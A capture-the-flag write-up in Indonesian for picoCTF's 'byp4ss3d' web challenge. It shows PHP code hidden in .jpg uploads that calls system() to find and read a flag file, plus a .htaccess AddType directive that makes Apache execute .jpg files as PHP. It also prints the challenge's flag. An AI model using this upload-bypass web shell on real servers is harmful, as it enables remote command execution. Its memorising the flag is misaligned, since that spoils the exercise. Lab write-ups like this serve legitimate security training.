# PicoCTF - Bypassed

**Category:** web exploitation
**Challenge:** PicoCtf byp4ss3d


---


## **Deskripsi**

Portal pendaftaran online universitas meminta siswa untuk mengunggah kartu identitas mereka untuk verifikasi. Pengembang menempatkan beberapa filter di tempat untuk memastikan hanya file gambar yang diunggah tetapi apakah mereka cukup? Lihatlah bagaimana upload diimplementasikan. Mungkin ada cara untuk menyelinap melewati pemeriksaan dan berinteraksi dengan server dengan cara yang tidak seharusnya.

Rincian tambahan akan tersedia setelah meluncurkan contoh tantangan Anda.(ini soal ctf nya)

clue : Apache dapat ditipu untuk mengeksekusi file non-PHP sebagai PHP dengan .htaccessberkas

---


## **Tools**
- Firefox Browser
- Terminal Kali
- google (mencari tahu sc untuk htacces)

---

## **Langkah-Langkah**

```
saya diberikan web untuk mengupload file nya http://amiable-citadel.picoctf.net:56502/
```
```
sudah ketebak caranya pasti mencari direktori yg berisi flag, jadi saya membuat file jpg yg diisi script php  
```
```
saya membuat 2 file php, yang pertama berisi untuk mencari keberadaan flag dan yg kedua untuk melihat isi file flag
```
```
                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ nano test.jpg  
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ cat test.jpg 
<?php

echo system("find / -name *flag*");
?>
                                                                                                                                                                                                                                           
 
```
```
file pertama saya upload lalu saya buka inspect, yg pastinya script tidak berjalan
```
```
dan saya edit post nya dengan mengganti nama file menjadi .htaccess
dan script nya saya ganti jadi
<files "test.jpg">
    AddType application/x-httpd-php .jpg
</files>
```
```
saya resend dan saya cek scriptnya berjalan dengan memunculkan output dir dari sebuah flag yaitu. /var/www/flag.txt
```
```
saya membuat 1 file lagi untuk melihat isi txt
┌──(kali㉿kali)-[~/Downloads]
└─$ nano test2.jpg    
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Downloads]
└─$ cat test2.jpg
<?php 
echo system("cat /var/www/flag.txt")
?>
```
```
setelah di lakukan edit pada post yg sama seperti tadi, saya menemukan flag nya : picoCTF{s3rv3r_byp4ss_39f9de85}

```
---
## **berikut dokumentasinya**
<img width="1920" height="1080" alt="Screenshot_2026-02-27_22_47_25" src="https://github.com/user-attachments/assets/09453746-b8b7-48ba-881c-f8427e8637ab" />

<img width="1920" height="1080" alt="Screenshot_2026-02-27_22_47_03" src="https://github.com/user-attachments/assets/2a4304ad-7d3a-4ec5-b9af-5e8c0fb8a8b5" />

<img width="1920" height="1080" alt="Screenshot_2026-02-27_22_46_43" src="https://github.com/user-attachments/assets/8da83c12-0e66-480d-a3f5-973360f9189f" />
<img width="1920" height="1080" alt="Screenshot_2026-02-27_22_42_51" src="https://github.com/user-attachments/assets/5961172d-93be-4fc5-a234-4cf3f434798a" />


<img width="1920" height="1080" alt="Screenshot_2026-02-27_22_40_24" src="https://github.com/user-attachments/assets/a6dc1497-2999-4256-9e9f-29c54f062d66" />

<img width="1920" height="1080" alt="Screenshot_2026-02-27_22_40_09" src="https://github.com/user-attachments/assets/ebe98b08-af38-4283-9bcd-237206b9c04f" />


<img width="1920" height="1080" alt="Screenshot_2026-02-27_22_32_00" src="https://github.com/user-attachments/assets/1f5e865e-3cb3-4298-acb4-6e44ae8ec03a" />






